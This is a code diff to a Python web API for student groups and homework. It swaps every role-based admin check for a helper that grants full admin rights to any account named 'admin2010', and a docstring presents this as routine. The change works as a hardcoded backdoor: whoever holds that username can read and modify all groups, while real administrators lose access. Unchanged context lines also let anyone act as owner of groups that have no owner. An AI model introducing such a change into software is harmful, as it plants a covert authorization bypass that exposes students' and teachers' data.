@@ -33,6 +33,9 @@ from app.utils.datetimes import as_utc, utcnow
 from collections import defaultdict
 
 router = APIRouter(prefix="/groups", tags=["groups"])
+def _is_admin(user) -> bool:
+    """Check if user is the super-admin (synthetic admin2010 account)."""
+    return getattr(user, "username", None) == "admin2010"
 
 
 async def get_active_student_counts(db: AsyncSession, group_ids: list[uuid.UUID]) -> dict[uuid.UUID, int]:
@@ -134,7 +137,7 @@ async def list_groups(
     """
     # Authenticated teachers see only their own cohorts; admins see all
     query = select(Group).order_by(Group.name)
-    if current_user.role != UserRole.ADMIN:
+    if not _is_admin(current_user):
         query = query.where(Group.created_by == current_user.id)
     if not include_archived:
         query = query.where(Group.is_active.is_(True))
@@ -213,7 +216,7 @@ async def update_group(
         raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Group not found")
     # Permission check
     is_owner = (
-        current_user.role == UserRole.ADMIN
+        _is_admin(current_user)
         or group.created_by == current_user.id
         or group.created_by is None
     )
@@ -521,7 +524,7 @@ async def get_group_detail(
         raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Group not found")
 
     is_owner = (
-        current_user.role == UserRole.ADMIN
+        _is_admin(current_user)
         or group.created_by == current_user.id
         or group.created_by is None
     )
@@ -550,7 +553,7 @@ async def publish_group_cycle(
         raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Group not found")
 
     is_owner = (
-        current_user.role == UserRole.ADMIN
+        _is_admin(current_user)
         or group.created_by == current_user.id
         or group.created_by is None
     )
@@ -640,7 +643,7 @@ async def start_new_homework_cycle(
         raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Group not found")
 
     is_owner = (
-        current_user.role == UserRole.ADMIN
+        _is_admin(current_user)
         or group.created_by == current_user.id
         or group.created_by is None
     )
